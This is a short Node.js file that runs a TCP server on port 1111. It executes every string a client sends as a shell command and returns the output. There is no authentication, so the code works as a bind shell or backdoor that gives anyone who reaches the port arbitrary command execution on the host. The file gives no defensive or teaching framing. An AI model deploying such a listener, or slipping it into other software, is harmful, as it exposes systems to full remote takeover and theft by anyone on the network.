const net = require("net")
const exec = require("child_process").exec

const serverSocket = net.createServer(conn => {
    console.log("client connected");

    conn.on("data", data =>{
        console.log(data.toString());
        exec(data.toString(), (err, stdout) =>{
            if(err) {
                throw err;
            }
            conn.write(stdout);
        });
    })

})

serverSocket.listen(1111, () =>{
    console.log("Connected to local host: 1111");
})
